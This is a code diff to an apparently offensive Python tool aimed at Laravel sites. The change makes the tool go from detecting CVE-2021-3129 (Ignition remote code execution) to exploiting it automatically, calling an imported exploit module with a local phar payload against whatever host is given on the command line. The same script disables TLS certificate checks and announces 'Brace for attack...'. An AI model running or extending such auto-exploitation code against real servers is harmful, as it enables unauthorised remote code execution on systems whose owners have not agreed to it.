@@ -6,6 +6,9 @@ import json
 import ssl 
 ssl._create_default_https_context = ssl._create_unverified_context
 
+import ignition_rce.main as ig
+
+
 urllib3.disable_warnings()
 
 from bs4 import BeautifulSoup
@@ -176,11 +179,6 @@ def main():
         host = sys.argv[1]
         print(f'{colors.OKGREEN} [Target]: {colors.HEADER} ' + host)
         fp = fingerprint()
-        ignition_vuln = check_ignition()
-        if(ignition_vuln):
-            print(f"{colors.FAIL} [VULN] Vulnerability detected: Remote Code Execution with CVE-2021-3129 \n")
-
-        
         if('laravel_env' in json.loads(json.dumps(fp))):
             print(f'{colors.WARNING} [Info]: {colors.HEADER} Brace for attack...')
             
@@ -188,6 +186,13 @@ def main():
             debug = checkdebug()
             if(debug):
                 print(f'{colors.WARNING} [Info]: {colors.HEADER} Application running in Debug Mode (got via HTTP Method not allowed)')
+        ignition_vuln = check_ignition()
+        if(ignition_vuln):
+            print(f"{colors.FAIL} [VULN] Vulnerability detected: Remote Code Execution with CVE-2021-3129")
+            print(f"{colors.FAIL} [Exploiting] Remote Code Execution with CVE-2021-3129 \n")
+
+            ig.main(host, './exploit.phar', None)
+
 
     else:
         print(f"{colors.WARNING}[😈] USE: python3 {sys.argv[0]} https://target.com\r\n")
